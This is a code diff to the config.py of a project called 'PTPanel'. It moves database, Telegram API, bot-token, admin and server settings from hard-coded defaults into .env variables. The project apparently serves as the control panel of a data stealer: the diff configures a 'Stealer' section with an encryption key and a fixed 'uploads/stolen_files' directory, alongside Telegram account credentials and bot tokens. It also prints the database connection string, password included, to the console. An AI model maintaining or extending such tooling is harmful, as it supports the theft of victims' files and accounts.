@@ -1,3 +1,4 @@
+# config.py
 import os
 import logging
 import sys
@@ -11,6 +12,10 @@ if sys.platform == "win32":
         sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
     if hasattr(sys.stderr, 'buffer'): 
         sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
+
+# Load environment variables
+from dotenv import load_dotenv
+load_dotenv()
 
 # Configure logging
 logging.basicConfig(
@@ -86,40 +91,40 @@ class LoggingConfig:
 
 class PTPanelConfig:
     def __init__(self):
-        # Database
+        # Database - тільки з .env
         self.db = DatabaseConfig(
-            url=os.getenv('DATABASE_URL', 'postgresql://postgres:password@localhost:5432/ptpanel'),
+            url=os.getenv('DATABASE_URL'),
             echo=os.getenv('DEBUG', 'False').lower() == 'true'
         )
         
-        # Telegram
+        # Telegram - тільки з .env
         self.telegram = TelegramConfig(
-            api_id=int(os.getenv('API_ID', 0)),
-            api_hash=os.getenv('API_HASH', ''),
+            api_id=int(os.getenv('API_ID')),
+            api_hash=os.getenv('API_HASH'),
             bot_tokens=self._parse_bot_tokens(),
             phone=os.getenv('PHONE_NUMBER')
         )
         
-        # Admin
+        # Admin - тільки з .env
         self.admin = AdminConfig(
-            username=os.getenv('ADMIN_USERNAME', 'admin'),
-            password=os.getenv('ADMIN_PASSWORD', 'admin123'),
+            username=os.getenv('ADMIN_USERNAME'),
+            password=os.getenv('ADMIN_PASSWORD'),
             cookie_secure=os.getenv('DEBUG', 'False').lower() != 'true'
         )
         
-        # Server
+        # Server - тільки з .env
         self.server = ServerConfig(
-            host=os.getenv('HOST', '0.0.0.0'),
-            port=int(os.getenv('PORT', 5000)),
+            host=os.getenv('HOST'),
+            port=int(os.getenv('PORT')),
             debug=os.getenv('DEBUG', 'False').lower() == 'true',
-            secret_key=os.getenv('SECRET_KEY', 'ptpanel-dev-secret-key-change-in-production'),
+            secret_key=os.getenv('SECRET_KEY'),
             app_name="PTPanel"
         )
         
-        # Stealer
+        # Stealer - тільки з .env
         self.stealer = StealerConfig(
-            encryption_key=os.getenv('ENCRYPTION_KEY', 'ptpanel-default-encryption-key-32-chars!!'),
-            upload_dir=os.getenv('UPLOAD_DIR', 'uploads/stolen_files')
+            encryption_key=os.getenv('ENCRYPTION_KEY'),
+            upload_dir='uploads/stolen_files'  # Фіксоване значення
         )
         
         # Paths
@@ -145,16 +150,24 @@ class PTPanelConfig:
         self._print_config_info()
     
     def _parse_bot_tokens(self) -> List[str]:
-        """Parse bot tokens from environment variable"""
-        tokens_str = os.getenv('BOT_TOKENS', '')
-        if not tokens_str:
-            return []
-        
+        """Parse bot tokens from separate environment variables"""
         tokens = []
-        for token in tokens_str.split(','):
-            token = token.strip()
+        
+        # Список всіх ботів
+        bot_vars = [
+            'BOT_WEBAPP_TOKEN',
+            'BOT_CLASSIC_TOKEN', 
+            'BOT_MULTITOOL_TOKEN',
+            'BOT_ADMIN_TOKEN'
+        ]
+        
+        for bot_var in bot_vars:
+            token = os.getenv(bot_var)
             if token and ':' in token:
                 tokens.append(token)
+                logger.info(f"Loaded token for {bot_var}")
+            elif token:
+                logger.warning(f"Invalid token format for {bot_var}")
         
         return tokens
     
@@ -223,6 +236,7 @@ class PTPanelConfig:
     def _print_config_info(self):
         """Print configuration information"""
         print(f">>> PTPanelConfig - Using DATABASE_URL: {self.db.url}")
+        print(f">>> Loaded {len(self.telegram.bot_tokens)} bot tokens")
         if not self.telegram.bot_tokens:
             print(">>> WARNING: No bot tokens configured. Bot features will be disabled.")
         if self.server.debug:
